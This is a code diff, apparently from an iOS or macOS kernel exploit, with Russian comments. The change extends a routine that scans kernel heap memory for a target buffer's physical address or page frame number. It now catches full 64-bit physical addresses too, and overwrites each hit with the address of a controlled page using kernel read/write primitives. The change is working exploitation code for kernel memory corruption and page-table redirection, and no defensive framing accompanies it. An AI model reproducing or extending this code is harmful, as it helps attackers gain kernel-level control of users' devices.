@@ -5746,7 +5746,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     uint64_t tableVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
     uint64_t totalPages = kconstant(physSize) >> 14;
     uint64_t hitVAs[8];
-    int hitHalf[8];
+    int hitHalf[8];   // форма поля: 0 = pfn32 lo32, 1 = pfn32 hi32, 2 = raw PA (полная qword-подмена)
     int hitN = 0;
     uint32_t pfn32 = (uint32_t)(backingPA >> 14);
     uint32_t ctlPFN = (uint32_t)(ctlPA >> 14);
@@ -5765,7 +5765,16 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         for (uint32_t o = 0; o + 8 <= sizeof(buf); o += 8) {
             uint64_t q = 0;
             memcpy(&q, buf + o, 8);
-            if (q == backingPA) { nRaw++; continue; }
+            if (q == backingPA) {
+                if (hitN < 8) {
+                    hitVAs[hitN] = kva + o;
+                    hitHalf[hitN] = 2;   // форма: сырой PA (полная qword-подмена)
+                    kpNote(r, [NSString stringWithFormat:@"  ★ RAW backingPA @ %#llx (heap)", (unsigned long long)(kva + o)]);
+                    hitN++;
+                }
+                nRaw++;
+                continue;
+            }
             if (q == pfn64) { nPfn64++; continue; }
             if (q == attrPA) { nAttr++; continue; }
             uint32_t lo = (uint32_t)q, hi = (uint32_t)(q >> 32);
@@ -5782,7 +5791,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             }
         }
     }
-    kpNote(r, [NSString stringWithFormat:@"  backingPA %#llx = PFN32 %#x; попаданий: pfn32-полей=%d (raw=%d pfn64=%d attr=%d)",
+    kpNote(r, [NSString stringWithFormat:@"  backingPA %#llx = PFN32 %#x; полей собрано=%d (счётчики форм: raw=%d pfn64=%d attr=%d)",
               (unsigned long long)backingPA, pfn32, hitN, nRaw, nPfn64, nAttr]);
     if (!hitN) {
         kpNote(r, @"  backingPA не найден в heap — записей не будет");
@@ -5798,19 +5807,28 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     int confirmed = -1;
     for (int h = 0; h < hitN; h++) {
         uint64_t hv = hitVAs[h];
-        int half = hitHalf[h];
-        uint64_t origQ = 0;
+        int form = hitHalf[h];   // 0=pfn-lo, 1=pfn-hi, 2=raw PA
+        uint64_t origQ = 0, newQ = 0;
         kreadbuf(hv, &origQ, 8);
-        uint32_t cur = half ? (uint32_t)(origQ >> 32) : (uint32_t)origQ;
-        if (cur != pfn32) {
-            kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: половина уже не наш pfn (%#x) — пропуск", h, (unsigned long long)hv, cur]);
-            continue;
+        if (form == 2) {
+            if (origQ != backingPA) {
+                kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: уже не backing (%#llx) — пропуск", h, (unsigned long long)hv, (unsigned long long)origQ]);
+                continue;
+            }
+            newQ = ctlPA;
+            kpNote(r, [NSString stringWithFormat:@"  hit #%d: ПОДМЕНА raw %#018llx → %#018llx (контрольная)", h, (unsigned long long)origQ, (unsigned long long)newQ]);
+        } else {
+            uint32_t cur = form ? (uint32_t)(origQ >> 32) : (uint32_t)origQ;
+            if (cur != pfn32) {
+                kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: половина уже не наш pfn (%#x) — пропуск", h, (unsigned long long)hv, cur]);
+                continue;
+            }
+            // пишем ТОЛЬКО совпавшую половину (вторая — вероятно счётчик страниц)
+            newQ = form ? ((origQ & 0xFFFFFFFFULL) | ((uint64_t)ctlPFN << 32))
+                        : ((origQ & 0xFFFFFFFF00000000ULL) | ctlPFN);
+            kpNote(r, [NSString stringWithFormat:@"  hit #%d: ПОДМЕНА %#018llx → %#018llx (pfn %#x → %#x, %s32)",
+                      h, (unsigned long long)origQ, (unsigned long long)newQ, pfn32, ctlPFN, form ? "hi" : "lo"]);
         }
-        // пишем ТОЛЬКО совпавшую половину (вторая — вероятно счётчик страниц)
-        uint64_t newQ = half ? ((origQ & 0xFFFFFFFFULL) | ((uint64_t)ctlPFN << 32))
-                             : ((origQ & 0xFFFFFFFF00000000ULL) | ctlPFN);
-        kpNote(r, [NSString stringWithFormat:@"  hit #%d: ПОДМЕНА %#018llx → %#018llx (pfn %#x → %#x, %s32)",
-                  h, (unsigned long long)origQ, (unsigned long long)newQ, pfn32, ctlPFN, half ? "hi" : "lo"]);
         kwritebuf(hv, &newQ, 8);
         uint64_t rb = 0;
         kreadbuf(hv, &rb, 8);
